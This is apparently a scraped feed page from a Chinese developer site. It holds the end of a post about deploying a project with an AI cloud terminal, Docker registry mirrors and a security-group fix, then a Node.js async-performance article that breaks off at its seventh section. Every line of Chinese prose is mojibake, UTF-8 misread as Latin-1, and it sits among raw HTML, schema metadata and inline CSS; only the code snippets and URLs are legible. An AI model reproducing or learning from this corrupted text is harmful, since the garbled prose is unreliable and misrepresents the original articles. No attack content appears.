<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2549c5d730924ef5b05701449c4522be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=r2r4VZ0KUivn2wu0pDn%2BuHScOv8%3D" alt="" loading="lazy"/></p>
<p>è¯•äº†ä¸‹å‘ç°æ˜¯ <strong>AI</strong> åŠ æŒçš„ç»ˆç«¯ï¼Œç›´æ¥ç”¨ "<strong>è‡ªç„¶è¯­è¨€</strong>" æè¿°éœ€æ±‚ï¼ŒAIå°±ä¼šè‡ªåŠ¨æ‰§è¡Œå¯¹åº”çš„å‘½ä»¤ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5209447066b84977b8b38b5d3efa6554~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=6Q4RAbpTiew2Kp8sP94k05ZCbxU%3D" alt="" loading="lazy"/></p>
<p>å§æ§½ï¼Œçˆ½å•Šï¼å¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒæˆ‘è®°ä¸ä½ä¸€å † <strong>è¿ç»´å‘½ä»¤</strong> äº† (ğŸ¤£è™½ç„¶æ²¡å‡ æ¡)ï¼Œè€Œä¸”è¿˜æœ‰ "<strong>å‘½ä»¤è§£é‡Š</strong>"ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/485414ca063749c98d3060148466b4c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=mtjj9jCVoXMoQNrbGvOClTGs3V4%3D" alt="" loading="lazy"/></p>
<p>æ¥ç€å°±æ˜¯é€æ­¥CVéƒ¨ç½²æ–‡æ¡£é‡Œçš„ä¸œè¥¿å‘ç»™å®ƒäº†ï¼Œç„¶åä¸­é€” <strong>Docker æ‹‰é•œåƒ</strong> ä¸€ç›´è¶…æ—¶ï¼Œåˆ‡äº†é˜¿é‡Œäº‘è‡ªå¸¦çš„ <strong>é•œåƒåŠ é€Ÿå™¨</strong> ä¹Ÿä¸è¡Œ (pythonå¯ä»¥ã€node:18ä¸è¡Œ)ï¼Œåé¢ç›´æ¥æ£€ç´¢äº†ä¸€æ³¢æ‰€æœ‰èƒ½ç”¨çš„é•œåƒæºï¼Œå°±å¥½äº†~</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-string">"https://é˜¿é‡Œçš„.mirror.aliyuncs.com"</span><span class="hljs-punctuation">,</span>
<span class="hljs-string">"https://docker.1panel.live"</span><span class="hljs-punctuation">,</span>
<span class="hljs-string">"http://mirrors.ustc.edu.cn/"</span><span class="hljs-punctuation">,</span>
<span class="hljs-string">"http://mirror.azure.cn/"</span><span class="hljs-punctuation">,</span>
<span class="hljs-string">"https://hub.rat.dev/"</span><span class="hljs-punctuation">,</span>
<span class="hljs-string">"https://docker.ckyl.me/"</span><span class="hljs-punctuation">,</span>
<span class="hljs-string">"https://docker.chenby.cn"</span><span class="hljs-punctuation">,</span>
<span class="hljs-string">"https://docker.hpcloud.cloud"</span><span class="hljs-punctuation">,</span>
<span class="hljs-string">"https://docker.m.daocloud.io"</span>
</code></pre>
<p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€äº›å…¶å®ƒçš„æŠ¥é”™ï¼ŒAIç»ˆç«¯æä¸å®šçš„ï¼Œå°±CVå‘ç»™ <strong>Trae</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57acd8901d784382b67f4bbbae0c6c9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=nqzuaCIlimbntru%2Bw6LV0D5L%2FcA%3D" alt="" loading="lazy"/></p>
<p><strong>Docker Compose</strong> æˆåŠŸæ„å»ºå¹¶å¯åŠ¨äº†å®¹å™¨æœåŠ¡ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f7178ec7709469f8a589b93ce192cb4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=tnoPMu81c6UlSlDE4zIwem1AlJs%3D" alt="" loading="lazy"/></p>
<p><strong>curl <a href="https://link.juejin.cn?target=http%3A%2F%2F127.0.0.1%3A8000" target="_blank" title="http://127.0.0.1:8000" ref="nofollow noopener noreferrer">http://127.0.0.1:8000</a></strong> æµ‹è¯•ä¸‹æœåŠ¡æ˜¯å¦æ­£å¸¸è¿è¡Œï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83f5ae236c1544c9960aa9694988ef00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=WJHfc7zCSYb2%2FPWHgf4rc33WM5k%3D" alt="" loading="lazy"/></p>
<p>å¤–éƒ¨æµè§ˆå™¨é€šè¿‡ <strong>å…¬ç½‘IP</strong> è®¿é—®ï¼ŒæŠ¥é”™ <strong>ERR_EMPTY_RESPONSE</strong>ï¼Œç›´æ¥é—® <strong>AI</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5acf5048cabb4b85b51dae1609dd1adf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=DtSa3A8DHs8Ec8zfJiQDQpmhdI0%3D" alt="" loading="lazy"/></p>
<p>æ— è„‘ <strong>Ctrl</strong> <strong>â†©</strong>ï¸ è®©å®ƒéªŒè¯å°±å¥½äº†ï¼Œæœ€åå‘ç°æ˜¯ "<strong>äº‘æœåŠ¡å•†çš„å®‰å…¨ç»„æ²¡å¼€ç«¯å£</strong>"ï¼Œè¿˜è€å¿ƒç»™å‡ºäº†è§£å†³æ­¥éª¤ï¼Œæˆ‘å“­æ­»ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/023cb1528a08494a919de7c1a35f2625~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=brwnG1anCFj%2Fn9o7DUAmsy0uaCI%3D" alt="" loading="lazy"/></p>
<p>é…ç½®å®Œï¼Œå†æ¬¡åˆ·æ–°é¡µé¢ï¼Œå¥½äº†ğŸ‘ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/189f43d1346f44399656c5319cb1eb58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=SrvFbmArGvU%2FbDP83MelZyAef2o%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">3. å°ç»“</h2>
<p>ğŸ¤¡ çˆ½ï¼å¤ªçˆ½äº†ï¼æœ¬æ¥æƒ³ç€ "<strong>åç«¯é‡æ„ + å‰ç«¯å¼€å‘ + éƒ¨ç½²</strong>"ï¼Œè‡³å°‘å¾—æŠ˜è…¾ä¸ªä¸€æ˜ŸæœŸå§ï¼Œç»“æœï¼š</p>
<ul>
<li>ã€ <strong>TRAE SOLO</strong>ã€‘åº”è¯¥æ˜¯å†…ç½®äº† <strong>äº§å“å¼€å‘æµæ°´çº¿</strong> ç›¸å…³çš„ <strong>å®Œæ•´å·¥ä½œæµ</strong>ï¼ŒğŸ¤£ 2333ï¼Œæˆ‘ç²¾å¿ƒå‡†å¤‡çš„ "<strong>å…¨æ ˆå¼€å‘è½åœ°æ–¹æ–¹è®º</strong>" è¿˜æ²¡å¼€å§‹å®æ–½ï¼Œå®ƒå°±æŠŠå‰é¢è¿™ä¸¤é¡¹å¹²å®Œäº†ã€‚</li>
<li>é…åˆã€<strong>äº‘æœåŠ¡å•†æä¾›çš„AIç»ˆç«¯</strong>ã€‘ï¼Œéƒ¨ç½²èµ·æ¥ä¹Ÿæ˜¯è½»è½»æ¾æ¾ã€‚æ¢ä»¥å‰ï¼Œå¾—è®°ä¸€å † <strong>è¿ç»´å‘½ä»¤</strong> (ä¸åŒOSçš„å‘½ä»¤å’Œé…ç½®è¿˜å¯èƒ½ä¸åŒ)ï¼Œç»å¸¸é™·åœ¨ <strong>æŠ¥é”™ â†’ æœç´¢ â†’ ä¿®æ”¹ â†’ éªŒè¯ â†’ å†æŠ¥é”™</strong>... çš„åå¤å¾ªç¯ä¸­æ€€ç–‘äººç”Ÿã€‚</li>
</ul>
<p>ğŸ¤·â€â™€ï¸ ä¸å¾—ä¸æ„Ÿå¹ï¼ŒAI å‘å±•ä¹‹è¿…çŒ›å•Š~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js ç¼–ç¨‹å®æˆ˜ï¼šæ·±å…¥æŒæ¡å¼‚æ­¥æ€§èƒ½ä¼˜åŒ–]]></title>    <link>https://juejin.cn/post/7582156410320207882</link>    <guid>https://juejin.cn/post/7582156410320207882</guid>    <pubDate>2025-12-11T07:22:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582156410320207882" data-draft-id="7582118218649387034" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js ç¼–ç¨‹å®æˆ˜ï¼šæ·±å…¥æŒæ¡å¼‚æ­¥æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="keywords" content="åç«¯,Node.js,Trae"/> <meta itemprop="datePublished" content="2025-12-11T07:22:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜çˆ±é’“é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js ç¼–ç¨‹å®æˆ˜ï¼šæ·±å…¥æŒæ¡å¼‚æ­¥æ€§èƒ½ä¼˜åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜çˆ±é’“é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:22:00.000Z" title="Thu Dec 11 2025 07:22:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>Node.js ä»¥äº‹ä»¶é©±åŠ¨å’Œéé˜»å¡ I/O é—»åï¼Œæ˜¯æ„å»ºé«˜å¹¶å‘æœåŠ¡å™¨çš„ç†æƒ³é€‰æ‹©ã€‚ä½†è¿™å¹¶ä¸æ„å‘³ç€æ‰€æœ‰å¼‚æ­¥ä»£ç éƒ½èƒ½è‡ªåŠ¨è·å¾—æœ€ä½³æ€§èƒ½ã€‚è®¸å¤šå¼€å‘è€…åœ¨å®é™…é¡¹ç›®ä¸­å¿½è§†äº†å¼‚æ­¥æ€§èƒ½çš„å…³é”®ç‚¹ï¼Œå¯¼è‡´ Node.js åº”ç”¨å‡ºç°å»¶è¿Ÿå¢åŠ ã€ååé‡é™ä½ç”šè‡³é˜»å¡äº‹ä»¶å¾ªç¯çš„é—®é¢˜ã€‚</p>
</blockquote>
<p>è¦æƒ³çœŸæ­£å‘æŒ¥ Node.js çš„æ€§èƒ½ä¼˜åŠ¿ï¼Œå°±å¿…é¡»æ·±å…¥ç†è§£å¼‚æ­¥æœºåˆ¶å¹¶é‡‡ç”¨æ›´åˆç†çš„ä¼˜åŒ–ç­–ç•¥ã€‚æœ¬æ–‡å°†ä»äº‹ä»¶å¾ªç¯ã€I/O æ¨¡å‹ã€Promise/async çš„ä½¿ç”¨æ–¹å¼ã€å¹¶å‘ç­–ç•¥ç­‰æ–¹é¢ç³»ç»Ÿè§£æå¦‚ä½•ä¼˜åŒ– Node.js çš„å¼‚æ­¥æ€§èƒ½ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ç†è§£å¼‚æ­¥æ€§èƒ½ä¼˜åŒ–çš„æ ¸å¿ƒï¼šäº‹ä»¶å¾ªç¯ä¸æ˜¯æ— é™çš„</h2>
<p>Node.js å•çº¿ç¨‹çš„æœ¬è´¨å†³å®šäº†äº‹ä»¶å¾ªç¯æ˜¯å…³é”®èµ„æºã€‚ä»»ä½•é˜»å¡äº‹ä»¶å¾ªç¯çš„ä»£ç éƒ½ä¼šå½±å“æ•´ä½“æ€§èƒ½ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li>å¤§é‡åŒæ­¥è®¡ç®—</li>
<li>å¤§æ–‡ä»¶çš„åŒæ­¥è¯»å†™</li>
<li>å¤æ‚çš„ JSON.parse</li>
<li>é¢‘ç¹ await é˜»å¡å¾®ä»»åŠ¡é˜Ÿåˆ—</li>
</ul>
<p>å› æ­¤ï¼Œä¼˜åŒ–å¼‚æ­¥æ€§èƒ½çš„ç¬¬ä¸€æ­¥æ˜¯ï¼šé¿å…é˜»å¡äº‹ä»¶å¾ªç¯ï¼Œä¸º CPU å¯†é›†å‹ä»»åŠ¡é€‰æ‹©åˆé€‚çš„æ‰§è¡Œæ–¹å¼ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€é¿å…ä¸å¿…è¦çš„åŒæ­¥æ“ä½œ</h2>
<p>Node.js è™½ç„¶æä¾›äº†è®¸å¤šåŒæ­¥ APIï¼ˆå¦‚ fs.readFileSyncï¼‰ï¼Œä½†å®ƒä»¬ä¼šå®Œå…¨é˜»å¡äº‹ä»¶å¾ªç¯ï¼Œå¯¼è‡´å…¶ä»–è¯·æ±‚æ— æ³•å¤„ç†ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">"big.txt"</span>); <span class="hljs-comment">// é˜»å¡æ•´ä¸ªçº¿ç¨‹</span>
</code></pre>
<p>åœ¨çº¿ä¸ŠæœåŠ¡ä¸­ï¼Œè¿™ç±»åŒæ­¥æ“ä½œåº”å½»åº•é¿å…ï¼Œå…¨éƒ¨æ”¹ç”¨å¼‚æ­¥ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-js" lang="js">fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"big.txt"</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {});
</code></pre>
<p>å³ä¾¿ä½¿ç”¨ Promise æˆ– async/awaitï¼Œä¹Ÿä¸€å®šè¦åŸºäºå¼‚æ­¥ APIï¼Œå¦åˆ™æœ¬è´¨ä»ç„¶æ˜¯åŒæ­¥é˜»å¡ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€åˆç†åˆ©ç”¨ Promise å¹¶å‘å¤„ç†</h2>
<p>å¦‚æœå¤šä¸ªå¼‚æ­¥ä»»åŠ¡å½¼æ­¤ç‹¬ç«‹ï¼Œä¸åº”ä¸²è¡Œæ‰§è¡Œã€‚é”™è¯¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> a = <span class="hljs-keyword">await</span> <span class="hljs-title function_">taskA</span>();
<span class="hljs-keyword">const</span> b = <span class="hljs-keyword">await</span> <span class="hljs-title function_">taskB</span>();
<span class="hljs-keyword">const</span> c = <span class="hljs-keyword">await</span> <span class="hljs-title function_">taskC</span>();
</code></pre>
<p>è¿™æ˜¯å…¸å‹çš„â€œåŒæ­¥å†™æ³•å¯¼è‡´å¼‚æ­¥å˜ä¸²è¡Œâ€ï¼Œæ€§èƒ½ä¼šæ˜æ˜¾ä¸‹é™ã€‚</p>
<p>æ›´é«˜æ•ˆçš„æ–¹å¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> [a, b, c] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<span class="hljs-title function_">taskA</span>(), <span class="hljs-title function_">taskB</span>(), <span class="hljs-title function_">taskC</span>()]);
</code></pre>
<p>é€‚ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>å¤šä¸ªæ•°æ®åº“æŸ¥è¯¢</li>
<li>å¤šä¸ªæ–‡ä»¶æ“ä½œ</li>
<li>å¤šä¸ª API è¯·æ±‚</li>
</ul>
<p>Promise.all æ˜¯æå‡å¼‚æ­¥æ€§èƒ½çš„æœ€é‡è¦æ–¹æ³•ä¹‹ä¸€ã€‚</p>
<hr/>
<h2 data-id="heading-3">å››ã€æ­£ç¡®å¤„ç†å¤§é‡å¹¶å‘ä»»åŠ¡ï¼šé™åˆ¶å¹¶å‘æ•°é‡</h2>
<p>è™½ç„¶ Promise.all å¯ä»¥å¹¶å‘æ‰€æœ‰ä»»åŠ¡ï¼Œä½†è‹¥ä»»åŠ¡æ•°é‡å·¨å¤§ï¼ˆå¦‚ 10 ä¸‡ä¸ªæ–‡ä»¶å¤„ç†ï¼‰ï¼Œä¸€æ¬¡æ€§å¹¶å‘ä¼šé€ æˆèµ„æºè€—å°½ã€‚</p>
<p>åœ¨é«˜å¹¶å‘ä»»åŠ¡ä¸­ï¼Œåº”ä½¿ç”¨â€œå¹¶å‘æ± â€ï¼ˆConcurrency Poolï¼‰æ§åˆ¶å¹¶å‘æ•°é‡ã€‚ä¾‹å¦‚ä½¿ç”¨ p-limit æˆ–è‡ªå®šä¹‰é˜Ÿåˆ—ã€‚</p>
<p>ç¤ºä¾‹ï¼ˆp-limitï¼‰ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> limit = <span class="hljs-built_in">require</span>(<span class="hljs-string">"p-limit"</span>)(<span class="hljs-number">10</span>);

<span class="hljs-keyword">const</span> tasks = urls.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">url</span>) =&gt;</span>
  <span class="hljs-title function_">limit</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">fetch</span>(url))
);

<span class="hljs-keyword">const</span> results = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(tasks);
</code></pre>
<p>è¿™æ ·å¯ä»¥ï¼š</p>
<ul>
<li>é¿å…ç½‘ç»œè¿æ¥è€—å°½</li>
<li>é¿å…è¿‡å¤šæ–‡ä»¶æè¿°ç¬¦å ç”¨</li>
<li>é¿å…äº‹ä»¶å¾ªç¯è¢«è¿‡å¤š Promise å¾®ä»»åŠ¡æ·¹æ²¡</li>
</ul>
<p>è¿™æ˜¯å·¥ç¨‹çº§ä»£ç ä¸­éå¸¸å…³é”®çš„æ€§èƒ½ä¼˜åŒ–æ‰‹æ®µã€‚</p>
<hr/>
<h2 data-id="heading-4">äº”ã€å‡å°‘ä¸å¿…è¦çš„ awaitï¼Œæé«˜äº‹ä»¶å¾ªç¯ååé‡</h2>
<p>await ä¼šè®©å½“å‰ async å‡½æ•°æš‚åœï¼Œè¿™å¯¹ä¸šåŠ¡é€»è¾‘æ¸…æ™°å¾ˆæœ‰ç”¨ï¼Œä½†åœ¨é«˜å¹¶å‘æƒ…å†µä¸‹å¯èƒ½ä¼šé™ä½æ•´ä½“ååé‡ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> list) {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">process</span>(item); <span class="hljs-comment">// ä¸²è¡Œæ‰§è¡Œ</span>
}
</code></pre>
<p>å»ºè®®ï¼š</p>
<p>å¦‚æœä»»åŠ¡å½¼æ­¤ä¸ä¾èµ–ï¼Œç”¨å¹¶å‘æ–¹å¼ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(list.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">process</span>(item)));
</code></pre>
<p>å¦‚æœä»»åŠ¡æ•°é‡å¤§ï¼Œç”¨å¹¶å‘æ± ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">await</span> <span class="hljs-title function_">asyncPool</span>(<span class="hljs-number">10</span>, list, <span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">process</span>(item));
</code></pre>
<hr/>
<h2 data-id="heading-5">å…­ã€åˆ©ç”¨å¼‚æ­¥ I/O æ¨¡å‹è€Œé CPU è®¡ç®—ï¼ˆå¿…è¦æ—¶ä½¿ç”¨ worker_threadsï¼‰</h2>
<p>Node.js å¼‚æ­¥æ€§èƒ½ä¸»è¦æ¥è‡ªé«˜æ•ˆçš„ I/O æ¨¡å‹ï¼Œè€Œä¸æ˜¯ CPU è®¡ç®—èƒ½åŠ›ã€‚
å› æ­¤ï¼Œä¸åº”åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œ CPU å¯†é›†å‹ä»»åŠ¡ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>å›¾åƒå¤„ç†</li>
<li>è§†é¢‘è½¬ç </li>
<li>åŠ å¯†/è§£å¯†</li>
<li>å¤§é‡æ•°æ®å‹ç¼©</li>
</ul>
<p>è¿™äº›æ“ä½œä¼šé˜»å¡äº‹ä»¶å¾ªç¯ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li>ä½¿ç”¨ worker_threads</li>
<li>é€šè¿‡ Rust/Go/Python æ‰§è¡Œ CPU æ“ä½œå¹¶é€šè¿‡ API é›†æˆ</li>
<li>å¼€å‘ C++ addon æ‰©å±•</li>
</ul>
<p>ç¤ºä¾‹ï¼ˆworker_threadsï¼‰ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> { <span class="hljs-title class_">Worker</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">"worker_threads"</span>);

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">"./heavy-task.js"</span>, { <span class="hljs-attr">workerData</span>: input });
</code></pre>
<p>è¿™æ ·ä¸»çº¿ç¨‹ä¿æŒè½»é‡ï¼Œåªè´Ÿè´£å¤„ç† I/Oï¼Œæå‡æ•´ä½“å“åº”é€Ÿåº¦ã€‚</p>
<hr/>
<h2 data-id="heading-6">ä¸ƒã€ä¼˜åŒ– Promise ä¸ async/await çš„å¾®ä»»åŠ¡è¡Œä¸º</h2>
